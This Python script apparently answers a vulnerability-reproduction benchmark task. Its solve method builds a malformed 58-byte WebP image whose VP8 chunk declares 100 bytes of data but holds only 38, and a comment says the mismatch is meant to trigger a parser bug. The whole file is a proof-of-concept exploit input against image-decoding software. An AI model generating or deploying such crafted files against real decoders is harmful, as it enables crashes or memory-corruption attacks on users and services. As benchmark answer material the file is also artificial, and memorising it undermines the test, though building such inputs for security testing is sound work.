import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        riff = b'RIFF'
        webp = b'WEBP'
        vp8_ = b'VP8 '
        # Construct VP8 frame header:
        # frame tag: keyframe (bit 0 = 0), show_frame = 1 (bit 4),
        # first partition size = 30 (fits in 19 bits)
        first_partition_size = 30
        frame_tag_val = (1 << 4) | (first_partition_size << 5)
        frame_tag = struct.pack('<I', frame_tag_val)[:3]
        signature = b'\x9d\x01\x2a'  # VP8 keyframe signature
        width_minus_1 = 15
        height_minus_1 = 15
        width_bytes = struct.pack('<H', width_minus_1 & 0x3FFF)  # top 2 bits scale = 0
        height_bytes = struct.pack('<H', height_minus_1 & 0x3FFF)
        header = frame_tag + signature + width_bytes + height_bytes  # 3 + 3 + 2 + 2 = 10 bytes
        # Total desired file size = 58 bytes (ground-truth length)
        total_size = 58
        # RIFF size field is total_size - 8
        riff_size = total_size - 8
        # Chunk header (8 bytes) + data should make remaining after RIFF header (12 bytes)
        # Remaining after RIFF header: total_size - 12 = 46
        # We'll use chunk data size = 38 bytes to match total length:
        chunk_data_len = 38
        # Declared chunk size set larger than actual to trigger the bug; use 100 bytes
        declared_chunk_size = 100
        # Build chunk data: header (10 bytes) + padding zeros (28 bytes)
        padding_len = chunk_data_len - len(header)
        chunk_data = header + (b'\x00' * padding_len)
        # Assemble
        data = (
            riff +
            struct.pack('<I', riff_size) +
            webp +
            vp8_ +
            struct.pack('<I', declared_chunk_size) +
            chunk_data
        )
        return data